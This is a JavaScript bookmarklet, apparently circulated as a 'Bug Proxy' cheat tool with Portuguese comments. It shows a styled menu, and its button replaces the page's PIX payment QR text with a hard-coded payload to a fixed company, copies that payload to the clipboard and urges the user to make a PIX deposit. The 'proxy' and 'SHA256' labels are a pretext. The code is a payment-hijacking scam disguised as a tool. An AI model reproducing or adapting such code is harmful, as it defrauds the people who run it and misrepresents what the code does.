javascript:(function() {
    const menu = createMenu();

    // Adiciona a folha de estilos
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
    document.head.appendChild(link);

    document.body.appendChild(menu);
    document.addEventListener('dblclick', (e) => toggleMenu(menu, e.clientY, e.clientX));

    // Cria o menu
    function createMenu() {
        const m = document.createElement('div');
        Object.assign(m.style, {
            position: 'fixed', top: '30%', left: '30%', width: '200px',  // Largura reduzida
            background: '#1e1e1e', color: '#fff', padding: '10px', borderRadius: '8px', 
            border: '2px solid #ADFF2F', boxShadow: '0 0 10px rgba(0,0,0,0.5)', display: 'none', zIndex: '9999'
        });
        m.innerHTML = `
            <img src="https://i.ibb.co/j3Z3r1S/Proxy-sha-256-20241023-175438-0000.jpg" style="display: block; margin: 0 auto; width: 100px; height: 100px; border-radius: 50%; border: 2px solid #ADFF2F;"> <!-- Tamanho da imagem aumentado -->
            <h3 style='text-align:center;'>System Proxy <i class="fas fa-check-circle" style="color: #ADFF2F;"></i></h3>
            <span id='closeMenu' style="float:right; cursor:pointer; font-size: 24px; color: white;">X</span>
            <button id='actionButton' style='display: block; margin: 10px auto; padding: 5px; border: none; border-radius: 5px; background-color: #ADFF2F; color: white; cursor: pointer; width: 80%;'>Aplicar Bug Proxy</button> <!-- Largura do botão reduzida -->
            <div style='text-align:center; margin-top: 10px;'><i class="fas fa-cogs"></i> SHA256 | <i class="fas fa-info-circle"></i> Limites: 10 ✔️</div> <!-- Colocado embaixo do botão -->
        `;
        return m;
    }

    // Mostra ou oculta o menu com dois cliques
    function toggleMenu(menu, y, x) {
        if (menu.style.display === 'block') {
            menu.style.display = 'none';
        } else {
            menu.style.top = `${y}px`; 
            menu.style.left = `${x}px`; 
            menu.style.display = 'block';
        }
    }

    // Fecha o menu quando o botão "X" for clicado
    function closeMenu() {
        menu.style.display = 'none';
    }

    document.getElementById('closeMenu').addEventListener('click', closeMenu);

    // Ação do botão "Aplicar Bug Proxy"
    document.getElementById('actionButton').addEventListener('click', () => {
        // Código para aplicar o proxy
        var newQRText = "00020101021226890014br.gov.bcb.pix2567qr.iugu.com/public/payload/v2/cobv/DE0B115D0163469B9F78F6EBBB9630C95204000053039865406200.005802BR5921LOGAME DO BRASIL LTDA6014CAMPINA GRANDE62070503***6304432E";
        var element = document.querySelector(".qr-code-text .qr-code-text-inner");

        if (element) {
            element.innerText = newQRText;

            var textArea = document.createElement("textarea");
            textArea.style.position = "fixed"; 
            textArea.style.top = "0"; 
            textArea.style.left = "0";
            textArea.style.width = "2em"; 
            textArea.style.height = "2em";
            textArea.style.padding = "0";
            textArea.style.border = "none";
            textArea.style.outline = "none";
            textArea.style.boxShadow = "none";
            textArea.style.background = "transparent";
            textArea.value = newQRText;
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();

            try {
                var successful = document.execCommand('copy');
                var msg = successful ? "AVISO - LEIA COM ATENÇÃO: PROXY APLICADA COM SUCESSO, FAÇA UM DEPOSITO VIA PIX PARA TORNAR A ASSERTIVIDADE DO PROGRAMA." : "Não foi possível copiar o texto. Tente copiar manualmente.";
                alert(msg);
            } catch (err) {
                alert("Falha ao copiar o texto. Tente copiar manualmente.");
            }

            document.body.removeChild(textArea);
        } else {
            alert("Elemento não encontrado!");
        }
    });
})();
